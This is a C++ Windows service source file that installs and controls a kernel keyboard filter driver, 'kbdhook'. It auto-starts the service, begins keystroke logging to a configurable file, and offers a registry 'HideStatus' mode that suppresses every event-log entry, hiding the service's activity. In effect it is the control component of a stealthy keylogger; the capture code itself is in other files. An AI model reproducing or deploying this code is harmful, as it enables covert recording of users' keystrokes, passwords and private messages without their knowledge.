///////////////////////////////////////////////////////////////////////////////
//
//	Service of driver project file
//
//	kbdhooksrv.cpp - contain all service code
//
//		Author:		Baranov Artem
//		Creation date:	??.??.????
//		Last modify:	??.??.????
//
//
///////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <kbdhook.h>
#include <stdio.h>
#include <kbdhookmsgs.h>

#define SERVICE_NAME L"kbdhooksrv"

#pragma comment(linker, "/DEFAULTLIB:kbdhookdll.lib")

SERVICE_STATUS_HANDLE	ssHandle; //handle of service for set status
SERVICE_STATUS          ssStatus; //current status of the service

DWORD	dwSrvStatus; //demand operation for execute
HANDLE	hEventCtrlMesSend; //event for wake up service main thread for dispatch commands from SCM
DWORD	dwHideMode; //mode of hide

//program entry point
VOID WINAPI ServiceMain( DWORD dwArgc, LPTSTR* lpszArgv );
//function for dispatch commdands from SCM
VOID WINAPI SrvCtrl( DWORD fdwControl );
//out messages to debugger
VOID SrvDebugOut( LPWSTR wszMes, DWORD Error );
//set service status
BOOL ReportStatusToSCMgr( DWORD dwCurrentState,
                          DWORD dwWin32ExitCode,
                          DWORD dwWaitHint );
//read some values from registry and write data in args
BOOL KbdSrvQueryRegStartParam( OUT WCHAR** wszLogFileName, 
							   OUT LOG_MODE* LogMode, 
							   OUT PDWORD HideStatus );
//write data in program log for event viewer
VOID AddToMessageLog( WORD ErrType, DWORD dwEventID, LPCWSTR* wszMesLog );
//install service: keyboard driver or keyboard service
BOOL InstallService( IN LPCWSTR wszServicePath, IN LPCWSTR wszServiceName,
					 IN LPCWSTR wszServiceDisplayName, IN DWORD dwServiceType,
					 IN DWORD dwStartType, IN DWORD dwErrorControl,
					 IN LPCWSTR wszLoadOrderGroup, IN LPCWSTR wszDependOnService,
					 IN LPWSTR wszDescription );
//delete service from registry
BOOL RemoveService( IN LPCWSTR wszServiceName );
//print program keys for run
VOID KbdSrvPrintUsage(  );
//return in first arg path to folder where service install
BOOL GetSrvInstallDir( OUT LPWSTR wszSrvInstallDir, IN DWORD cchPrgInstallDir ); //cchPrgInstallDir with NULL-terminating
//add services as event source in registry
BOOL AddEventSource( LPWSTR pszMsgDLL );
//dispatch program arguments and return status of dispatch
enum START_STATUS
{ 
	ControlSuccess, 
	ControlFailed,
	NoValidParam
} KbdSrvDispatchCmdArgs( IN LPCWSTR wszArg );
//check access token on admin sid
BOOL IsUserAdmin(  );
//create parameter key and values for service
BOOL CreateParametersForService( IN PWSTR LogFileName, IN DWORD HideStatus, IN LOG_MODE LogMode );

INT wmain( INT argc, WCHAR** argv )
{
	SERVICE_TABLE_ENTRYW ServiceTable[] = 
	{ { SERVICE_NAME, ServiceMain },
	  { NULL, NULL }
	};
	DWORD LogMode;
	DWORD HideStatus;

	if( ( argc > 1 ) && 
		( ( *argv[1] == L'-' ) || ( *argv[1] == L'/' ) ) )
	{
		if( argc == 5 && lstrcmpiW( argv[1] + 1, L"create_param" ) == 0 )
		{
			LogMode = _wtoi( argv[3] );
			HideStatus = _wtoi( argv[4] );

			if( CreateParametersForService( argv[2], HideStatus, (LOG_MODE)LogMode ) )
			{
				wprintf( L"success\n" );
				return 0;
			}
			else
			{
				wprintf( L"error occur\n" );
				return 1;
			}
		}
		else
		{
			switch( KbdSrvDispatchCmdArgs( argv[1] + 1 ) )
			{
				case ControlFailed:
					wprintf( L"error occur\n" );
				return 1;
				case ControlSuccess:
					wprintf( L"success\n" );
				return 0;
				case NoValidParam:
					KbdSrvPrintUsage(  );
				return 1;
			}
		}
	}

	if( !StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRYW*)&ServiceTable ) )
	{
#ifdef _DEBUG
		SrvDebugOut( L"Kbd hook srv (%d)\n",
			GetLastError(  ));
#endif
	}

	return 0;
}

VOID WINAPI ServiceMain( DWORD dwArgc, LPTSTR* lpszArgv )
{
#ifdef _DEBUG
	DebugBreak(  );
#endif

	DWORD dwErrCode = NO_ERROR;
	PWSTR wszLogFileName;
	LOG_MODE LogMode;
	
	ssStatus.dwServiceType	= SERVICE_WIN32_OWN_PROCESS;
	ssStatus.dwCurrentState = SERVICE_START_PENDING;
	ssStatus.dwControlsAccepted = 0;
	ssStatus.dwWin32ExitCode = NO_ERROR;
	ssStatus.dwServiceSpecificExitCode = NO_ERROR;
	ssStatus.dwCheckPoint = 1;
	ssStatus.dwWaitHint = 9000;
	
	ssHandle = RegisterServiceCtrlHandler( SERVICE_NAME, SrvCtrl );

	SetServiceStatus( ssHandle, &ssStatus );

	if( !KbdSrvQueryRegStartParam( &wszLogFileName, &LogMode, &dwHideMode ) )
	{
		dwHideMode = 0;
		AddToMessageLog( EVENTLOG_ERROR_TYPE, MSG_INCORRECT_REG_DATA, NULL );
		
		ReportStatusToSCMgr( SERVICE_STOPPED, ERROR_FILE_NOT_FOUND, 0 );
		return;
	}

	dwSrvStatus = SERVICE_RUNNING;

	if( !InitKbdHook( wszLogFileName, (LOG_MODE)LogMode ) )
	{
		dwErrCode = GetLastError(  );
		dwSrvStatus = SERVICE_STOPPED;
	}
	else
		StartLog(  );
		
	ReportStatusToSCMgr( dwSrvStatus, dwErrCode, 0 );

	hEventCtrlMesSend = CreateEvent( NULL, FALSE, FALSE, NULL );

	AddToMessageLog( EVENTLOG_SUCCESS, MSG_INF_ERROR_1, NULL );
	AddToMessageLog( EVENTLOG_SUCCESS, MSG_INF_ERROR_2, NULL );

	while( 1 )
	{
		WaitForSingleObject( hEventCtrlMesSend, INFINITE );
		dwErrCode = NO_ERROR;

		switch( dwSrvStatus )
		{
			case SERVICE_CONTROL_PAUSE:
			{
				if( !StopLog(  ) )
					dwErrCode = GetLastError(  );
				ReportStatusToSCMgr( SERVICE_PAUSED, dwErrCode, 0 );
				AddToMessageLog( EVENTLOG_INFORMATION_TYPE, MSG_INF_ERROR_3, NULL );
				break;
			}
			case SERVICE_CONTROL_CONTINUE:
			{
				if( !StartLog(  ) )
					dwErrCode = GetLastError(  );
				ReportStatusToSCMgr( SERVICE_RUNNING, dwErrCode, 0 );
				AddToMessageLog( EVENTLOG_INFORMATION_TYPE, MSG_INF_ERROR_2, NULL );
				break;
			}
			case SERVICE_CONTROL_STOP:
			{
				if( !StopLog(  ) )
					dwErrCode = GetLastError(  );
				else
					UnInitKbdHook(  );

				AddToMessageLog( EVENTLOG_INFORMATION_TYPE, MSG_INF_ERROR_3, NULL );
				AddToMessageLog( EVENTLOG_INFORMATION_TYPE, MSG_INF_ERROR_4, NULL );	

				CloseHandle( hEventCtrlMesSend );
				ReportStatusToSCMgr( SERVICE_STOPPED, dwErrCode, 0 );
				return;
			}
			default:
			{
#ifdef _DEBUG
				SrvDebugOut( L"try using not implemented case in switch in service (%d)", 0 );
#endif
				break;
			}
		}
		//register in event viewer
	}

	HeapFree( GetProcessHeap(), 0, wszLogFileName );
}

VOID WINAPI SrvCtrl( DWORD fdwControl )
{
	DWORD ErrCode = NO_ERROR;

	if( dwSrvStatus == fdwControl )
		return;

	switch( fdwControl )
	{
		case SERVICE_CONTROL_PAUSE:
		{
			ReportStatusToSCMgr( SERVICE_PAUSE_PENDING, NO_ERROR, 9000 );
			//pause: log pause
			dwSrvStatus = SERVICE_CONTROL_PAUSE;
			break;
		}
		case SERVICE_CONTROL_CONTINUE:
		{
			ReportStatusToSCMgr( SERVICE_CONTINUE_PENDING, NO_ERROR, 9000 );
			//pause: log pause
			dwSrvStatus = SERVICE_CONTROL_CONTINUE;
			break;
		}
		case SERVICE_CONTROL_SHUTDOWN:
		case SERVICE_CONTROL_STOP:
		{
			ReportStatusToSCMgr( SERVICE_STOP_PENDING, NO_ERROR, 9000 );
			// stop driver: stop log and deinitialize
			dwSrvStatus = SERVICE_CONTROL_STOP;
			break;
		}
		case SERVICE_CONTROL_INTERROGATE:
			dwSrvStatus = ssStatus.dwCurrentState;
			ReportStatusToSCMgr( ssStatus.dwCurrentState, 0, 0 );
		break;

		default:
		break;
	}

	SetEvent( hEventCtrlMesSend );
}

VOID SrvDebugOut( LPWSTR wszMes, DWORD Error )
{
	WCHAR Buffer[1024]; 

	if ( wcslen( wszMes ) < 1000 ) 
	{ 
		wsprintf( Buffer, wszMes, Error ); 
		OutputDebugStringW( Buffer ); 
	} 
}

BOOL ReportStatusToSCMgr( DWORD dwCurrentState,
                          DWORD dwWin32ExitCode,
						  DWORD dwWaitHint )
{
   static DWORD dwCheckPoint = 1;
   BOOL fResult = TRUE;

   switch( dwCurrentState )
   {
		case SERVICE_START_PENDING:
		case SERVICE_STOP_PENDING:
		case SERVICE_CONTINUE_PENDING:
		case SERVICE_PAUSE_PENDING:
			ssStatus.dwControlsAccepted = 0;
		break;
		case SERVICE_RUNNING:
			ssStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_STOP;
		break;
		case SERVICE_PAUSED:
			ssStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE;
		break;
		case SERVICE_STOPPED:
			ssStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE;
		break;
   }

   ssStatus.dwCurrentState = dwCurrentState;
   ssStatus.dwWin32ExitCode = dwWin32ExitCode;
   ssStatus.dwWaitHint = dwWaitHint;

   if( ( dwCurrentState == SERVICE_RUNNING ) ||
	   ( dwCurrentState == SERVICE_PAUSED  ) ||
	   ( dwCurrentState == SERVICE_STOPPED ) )
		   ssStatus.dwCheckPoint = 0;
   else
	   ssStatus.dwCheckPoint = dwCheckPoint++;

   
	if ( !( fResult = SetServiceStatus( ssHandle, &ssStatus ) ) )
	{
#ifdef _DEBUG
		SrvDebugOut( L"service status not set (%d)", dwCurrentState );
#endif
		//AddToMessageLog(TEXT("SetServiceStatus"));
    }
  
   return fResult;
}

BOOL KbdSrvQueryRegStartParam( OUT WCHAR** wszLogFileName, OUT LOG_MODE* LogMode, OUT PDWORD HideStatus )
{
	static WCHAR wszRegPath[] = L"System\\CurrentControlSet\\Services\\";
	static WCHAR wszRegSubPath[] = L"\\parameters";
	static WCHAR wszParamOfLogFileName[] = L"LogFile";
	static WCHAR wszParamOfLogMode[] = L"LogMode";
	static WCHAR wszParamOfHideStatus[] = L"HideStatus";

	PWCHAR wszFullSrvRegPath = NULL;
	DWORD cbFullSrvRegPath = 0;
	DWORD status = 1;
	HKEY hReg = 0;
	DWORD cbRequired;
	DWORD dwType;

	*wszLogFileName = 0;

	cbFullSrvRegPath = (DWORD) wcslen( wszRegPath ) * sizeof( WCHAR ) +
		wcslen( SERVICE_NAME ) * sizeof( WCHAR ) + 
		wcslen( wszRegSubPath ) * sizeof( WCHAR ) + sizeof( WCHAR );

	wszFullSrvRegPath = (PWCHAR) HeapAlloc( GetProcessHeap(), 
		HEAP_ZERO_MEMORY, cbFullSrvRegPath );

	lstrcpyW( wszFullSrvRegPath, wszRegPath );
	lstrcatW( wszFullSrvRegPath, SERVICE_NAME );
	lstrcatW( wszFullSrvRegPath, wszRegSubPath );

	if( !wszFullSrvRegPath )
	{
		status = 0;
		goto cleanup;//error dispatch
	}

	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, 
		wszFullSrvRegPath,
		0, //must be zero
		KEY_QUERY_VALUE,
		&hReg ) != ERROR_SUCCESS )
	{
		status = 0;
		hReg = 0;
		goto cleanup;
	}

	if( RegQueryValueEx( hReg,
		wszParamOfLogFileName, //param name
		0, //reserved
		&dwType, //type
		NULL, //value of param
		&cbRequired ) != ERROR_SUCCESS )
	{
		status = 0;
		goto cleanup;
	}

	if( dwType != REG_SZ )
	{
		status = 0;
		goto cleanup;
	}

	*wszLogFileName = (PWCHAR)HeapAlloc( GetProcessHeap(), 
		HEAP_ZERO_MEMORY, cbRequired );

	if( !*wszLogFileName )
	{
		status = 0;
		goto cleanup;
	}

	if( RegQueryValueEx( hReg,
		wszParamOfLogFileName, //param name
		0, //reserved
		NULL, //type not required
		(BYTE*)*wszLogFileName, //value of param
		&cbRequired ) != ERROR_SUCCESS )
	{
		status = 0;
		goto cleanup;
	}

	if( RegQueryValueEx( hReg,
		wszParamOfLogMode, //param name
		0, //reserved
		&dwType, //restrict type
		NULL, //value of param
		&cbRequired ) != ERROR_SUCCESS )
	{
		status = 0;
		goto cleanup;
	}

	if( ( dwType != REG_DWORD ) ||
		( cbRequired != 4 ) )
	{
		status = 0;
		goto cleanup; 
	}

	if( RegQueryValueEx( hReg,
		wszParamOfLogMode, //param name
		0, //reserved
		&dwType, //restrict type
		(BYTE*)LogMode, //value of param
		&cbRequired ) != ERROR_SUCCESS )
	{
		status = 0;
		goto cleanup;
	}

	if( *LogMode )
	{
		if( (DWORD)*LogMode != 1 )
			*(PDWORD)LogMode = 1;
	}

	if( RegQueryValueEx( hReg,
		wszParamOfHideStatus, //param name
		0, //reserved
		&dwType, //restrict type
		NULL, //value of param
		&cbRequired ) != ERROR_SUCCESS )
	{
		status = 0;
		goto cleanup;
	}

	if( ( dwType != REG_DWORD ) ||
		( cbRequired != 4 ) )
	{
		status = 0;
		goto cleanup; 
	}

	if( RegQueryValueEx( hReg,
		wszParamOfHideStatus, //param name
		0, //reserved
		NULL, //required type
		(BYTE*)HideStatus, //value of param
		&cbRequired ) != ERROR_SUCCESS )
	{
		status = 0;
		goto cleanup;
	}

	if( *HideStatus )
	{
		if( *HideStatus != 1 )
			*HideStatus = 1;
	}

cleanup:

	if( wszFullSrvRegPath ) HeapFree( GetProcessHeap(), 0, (PVOID)wszFullSrvRegPath );
	if( hReg ) RegCloseKey( hReg );

	if( !status )
	{
		if( *wszLogFileName ) HeapFree( GetProcessHeap(), 0, (PVOID)*wszLogFileName );
	}

	return status;
}

VOID AddToMessageLog( WORD ErrType, DWORD dwEventID, LPCWSTR* wszMesLog )
{
	HANDLE hEvent;

	if( dwHideMode ) return;

	hEvent = RegisterEventSource( NULL, // for local computer
		SERVICE_NAME );

	if( !hEvent )
		return;

	if( !ReportEvent( hEvent,
		ErrType,
		0, //error category
		dwEventID, //error id
		NULL, //current user SID,
		0, //1 string
		0, //no bytes raw data,
		NULL,
		NULL //no raw data
		) )
	{
		return;
	}

	DeregisterEventSource( hEvent );
	
	return;
}

BOOL InstallService( IN LPCWSTR wszServicePath, IN LPCWSTR wszServiceName,
					 IN LPCWSTR wszServiceDisplayName, IN DWORD dwServiceType,
					 IN DWORD dwStartType, IN DWORD dwErrorControl, 
					 IN LPCWSTR wszLoadOrderGroup, IN LPCWSTR wszDependOnService,
					 IN LPWSTR wszDescription )
{
	SC_HANDLE hSM = NULL;
	SC_HANDLE hSrv = NULL;
	DWORD status = 1;
	HKEY hKey;
	WCHAR wszKeyName[260];
	DWORD cbDescription;
	
	hSM = OpenSCManager( NULL, //local machine
		NULL, //database def
		SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE );

	if( hSM == NULL )
		return 0;
	
	hSrv = CreateService( hSM,
		wszServiceName,
		wszServiceDisplayName,
		SERVICE_ALL_ACCESS,
		dwServiceType,
		dwStartType,
		dwErrorControl,
		wszServicePath,
		wszLoadOrderGroup, //group
		NULL, //tag
		wszDependOnService, //dependencies
		NULL, //account
		NULL //password
	);

	if( hSrv == NULL )
	{
		if( GetLastError(  ) == ERROR_SERVICE_EXISTS )
		{
			hSrv = OpenService( hSM, wszServiceName, SERVICE_CHANGE_CONFIG );

			status = ChangeServiceConfig( hSrv, dwServiceType, dwStartType, 
				dwErrorControl, wszServicePath, wszLoadOrderGroup, NULL, wszDependOnService, NULL, NULL, 
				wszServiceDisplayName );
		}
		else
		{
			status = 0;
		}
	}

	if( status && wszDescription )
	{
		lstrcpy( wszKeyName, L"System\\CurrentControlSet\\Services\\" );
		lstrcat( wszKeyName, wszServiceName );
		
		RegOpenKeyEx( HKEY_LOCAL_MACHINE, 
			wszKeyName, 
			0, //reserved 
			KEY_SET_VALUE,
			&hKey );

		cbDescription = lstrlen( wszDescription ) * sizeof( WCHAR ) + sizeof( WCHAR );

		if( RegSetValueEx( hKey, L"Description",
			0, //reserved
			REG_SZ,
			( BYTE* )wszDescription,
			cbDescription ) != ERROR_SUCCESS )
		{
			status = 0;
		}

		RegCloseKey( hKey );

	}

	if( hSM ) CloseServiceHandle( hSM );
	if( hSrv ) CloseServiceHandle( hSrv );

	return status;
}

BOOL RemoveService( IN LPCWSTR wszServiceName )
{
	SC_HANDLE hSM = NULL;
	SC_HANDLE hSrv = NULL;
	DWORD status = 1;
	SERVICE_STATUS ss;
	
	hSM = OpenSCManager( NULL, //local machine
		NULL, //database def
		SC_MANAGER_CONNECT );

	if( hSM == NULL )
		return 0;

	hSrv = OpenService( hSM, wszServiceName, 
		DELETE | SERVICE_QUERY_STATUS | SERVICE_STOP );

	if( hSrv )
	{
		QueryServiceStatus( hSrv, &ss );

		if( ss.dwCurrentState == SERVICE_STOPPED )
		{
			DeleteService( hSrv );
		}
		else
		{
			if( ControlService( hSrv, SERVICE_CONTROL_STOP, &ss ) )
			{
				Sleep( 1000 );

				while( QueryServiceStatus( hSrv, &ss ) )
				{
					if( ss.dwCurrentState == SERVICE_STOP_PENDING )
						Sleep( 1000 );
					else
						break;
				}

				if( ss.dwCurrentState == SERVICE_STOPPED )
					status = 1;
				else 
					status = 0;

				if( status )
				{
					if( DeleteService( hSrv ) )
						status = 1;
					else
						status = 0;
				}
			}
			else
				status = 0;
		}

		CloseServiceHandle( hSrv );
	}

	CloseServiceHandle( hSM );

	return status;
}

START_STATUS KbdSrvDispatchCmdArgs( IN LPCWSTR wszArg )
{
	WCHAR wszDriverName[] = L"kbdhook";
	WCHAR wszDisplayDriverName[] = L"Keyboard Filter Driver";
	WCHAR wszSystemDriverDir[] = L"System32\\Drivers\\";
	WCHAR wszPath[256];
	DWORD dwStatus;
	WCHAR wszDependOnService[] = 
	{ L'k', L'b', L'd', L'h', L'o', L'o', L'k', L'\0', L'\0' }; // L"kbdhook";
	WCHAR wszEventSource[] = L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\kbdhooksrv";
	WCHAR wszRegDriverPath[] = L"SYSTEM\\CurrentControlSet\\Services\\kbdhook";
	HKEY hKey;
	DWORD dwDeleteFlag = 1;

	if( lstrcmpiW( wszArg, L"install_driver" ) == 0 )
	{
		lstrcpyW( wszPath, wszSystemDriverDir );
		lstrcatW( wszPath, wszDriverName );
		lstrcatW( wszPath, L".sys" );
		
		dwStatus = InstallService( wszPath, wszDriverName, wszDisplayDriverName, 
			SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, 
			SERVICE_ERROR_NORMAL, L"Filter", L"Kbdclass", NULL );

		if( dwStatus ) return ControlSuccess;
		else return ControlFailed;

	}
	else if( lstrcmpiW( wszArg, L"remove_driver" ) == 0 )
	{
		if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, wszRegDriverPath, 
			0, KEY_SET_VALUE, &hKey ) != ERROR_SUCCESS )
				return ControlFailed;

		RegSetValueEx( hKey, L"DeleteFlag", 0, REG_DWORD, (BYTE*)&dwDeleteFlag, sizeof( DWORD ) );
		RegCloseKey( hKey );

		return ControlSuccess;
	}
	else if( lstrcmpiW( wszArg, L"install_service" ) == 0 )
	{
		if( !GetSrvInstallDir( wszPath, 256 ) )
		{
			__asm nop
#ifdef _DEBUG
			SrvDebugOut( L"GetSrvInstallDir failed %d", 0 );
#endif
		}

		lstrcatW( wszPath, L"kbdhooksrv.exe" );

		dwStatus = InstallService( wszPath, L"kbdhooksrv", L"Keyboard Filter Driver Service",
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
			NULL, wszDependOnService, L"Keyboard Log Service On-Access Keyboard Filter Driver" );

		if( dwStatus )
			return ControlSuccess;
		else
			return ControlFailed;
	}
	else if( lstrcmpiW( wszArg, L"remove_service" ) == 0 )
	{
		dwStatus = RemoveService( L"kbdhooksrv" );

		if( dwStatus ) return ControlSuccess;
		else return ControlFailed;
	}
	else if( lstrcmpiW( wszArg, L"register_source" ) == 0 )
	{
		if( !GetSrvInstallDir( wszPath, 256 ) )
		{
			__asm nop
#ifdef _DEBUG
			SrvDebugOut( L"GetSrvInstallDir failed %d", 0 );
#endif
		}

		lstrcatW( wszPath, L"kbdhookmsgs.dll" );
		
		dwStatus = AddEventSource( wszPath );

		if( dwStatus ) return ControlSuccess;
		else return ControlFailed;
	}
	else if( lstrcmpiW( wszArg, L"unregister_source" ) == 0 )
	{
		if( RegDeleteKey( HKEY_LOCAL_MACHINE, wszEventSource ) == ERROR_SUCCESS )
			return ControlSuccess;
		else
			return ControlFailed;
	}
	else if( lstrcmpiW( wszArg, L"check_admin" ) == 0 )
	{
		if( IsUserAdmin(  ) )
			return ControlSuccess;
		else
			return ControlFailed;
	}
	
	return NoValidParam;
}

BOOL GetSrvInstallDir( OUT LPWSTR wszSrvInstallDir, IN DWORD cchPrgInstallDir ) //cchPrgInstallDir with NULL-terminating
{
	DWORD dwStatus = 1;

	__try
	{
		ExpandEnvironmentStrings( L"%ProgramFiles%", wszSrvInstallDir, cchPrgInstallDir );

		lstrcatW( wszSrvInstallDir, L"\\BGU Soft\\Kbdhooksrv\\" );
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		dwStatus = 0;
	}

	return dwStatus;
}

VOID KbdSrvPrintUsage(  )
{
	wprintf( L"Usage: kbdhooksrv -{install_driver | remove_driver | install_service | remove_service | start_service | register_source}\n\n" );
	wprintf( L"-install_driver: install keyboard filter driver in your system\n" );
	wprintf( L"-remove_driver: remove keyboard filter driver from your system\n" );
	wprintf( L"-install_service: install keyboard filter driver service in your system\n" );
	wprintf( L"-remove_service: remove keyboard filter driver service from your system\n" );
	wprintf( L"-register_source: register event source in registry\n" );
	wprintf( L"-unregister_source: unregister event source from registry\n" );
	wprintf( L"-check_admin: check administrator sid in token access\n" );
	wprintf( L"-create_param LogFileFullPath LogMode LogStatus: create parameters for service in registry\n");
}

BOOL AddEventSource( LPWSTR pszMsgDLL )
{
	HKEY hk; 
	DWORD dwData, dwDisp; 
	WCHAR wszBuf[] = L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\kbdhooksrv"; 

   // Create the event source as a subkey of the log. 
	if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, wszBuf, 
          0, NULL, REG_OPTION_NON_VOLATILE,
          KEY_WRITE, NULL, &hk, &dwDisp ) != ERROR_SUCCESS ) 
			return FALSE;
	 
   // Set the name of the message file. 
 
	dwDisp = ( lstrlenW( pszMsgDLL ) + 1 ) * sizeof( WCHAR );
	if( RegSetValueEx( hk,              // subkey handle 
		L"EventMessageFile",        // value name 
		0,                         // must be zero 
		REG_SZ,					// value type 
		(LPBYTE) pszMsgDLL,        // pointer to value data 
		dwDisp ) != ERROR_SUCCESS ) // length of value data 
   {
      RegCloseKey(hk); 
      return FALSE;
   }
 
   // Set the supported event types. 
 
	dwData = EVENTLOG_ERROR_TYPE | EVENTLOG_SUCCESS | 
		EVENTLOG_INFORMATION_TYPE; 
 
	if( RegSetValueEx(hk,      // subkey handle 
		L"TypesSupported",  // value name 
		0,                 // must be zero 
		REG_DWORD,         // value type 
		(LPBYTE) &dwData,  // pointer to value data 
		sizeof( DWORD ) ) != ERROR_SUCCESS )    // length of value data 
	{
		RegCloseKey(hk);
		return FALSE;
	}
 
	RegCloseKey(hk); 
	return TRUE;
}

BOOL IsUserAdmin(  )
{
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;

	b = AllocateAndInitializeSid( &NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup );

	if( b )
	{
		if( !CheckTokenMembership( NULL, AdministratorsGroup, &b ) )
			b = FALSE;

		FreeSid( AdministratorsGroup );
	}
	
	return b;
}

BOOL CreateParametersForService( IN PWSTR LogFileName, IN DWORD HideStatus, IN LOG_MODE LogMode )
{
	WCHAR wszRegPath[] = L"System\\CurrentControlSet\\Services\\kbdhooksrv";
	HKEY hKey;
	HKEY hSubKey;
	DWORD cbLogFileName;
	BOOL b = TRUE;

	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, 
			wszRegPath, 
			0, //reserved 
			KEY_SET_VALUE | KEY_CREATE_SUB_KEY,
			&hKey ) != ERROR_SUCCESS )
		return FALSE;

	if( RegCreateKey( hKey, L"parameters", &hSubKey ) != ERROR_SUCCESS )
	{
		RegCloseKey( hKey );
		return FALSE;
	}

	cbLogFileName = lstrlen( LogFileName ) * sizeof( WCHAR ) + sizeof( WCHAR );

	__try
	{
		if( RegSetValueEx( hSubKey, L"LogFile",
			0, REG_SZ,(BYTE*) LogFileName, cbLogFileName ) != ERROR_SUCCESS )
		{
				b = FALSE;
				__leave;
		}

		if( HideStatus )
			HideStatus = 1;

		if( RegSetValueEx( hSubKey, L"HideStatus",
			0, REG_DWORD,(BYTE*) &HideStatus, sizeof( DWORD ) ) != ERROR_SUCCESS )
		{
				b = FALSE;
				__leave;
		}

		if( ( DWORD ) LogMode )
			LogMode = Text;

		if( RegSetValueEx( hSubKey, L"LogMode",
			0, REG_DWORD,(BYTE*) &LogMode, sizeof( DWORD ) ) != ERROR_SUCCESS )
		{
				b = FALSE;
				__leave;
		}
	}
	__finally
	{
		RegCloseKey( hKey );
		RegCloseKey( hSubKey );
	}

	return b;
}
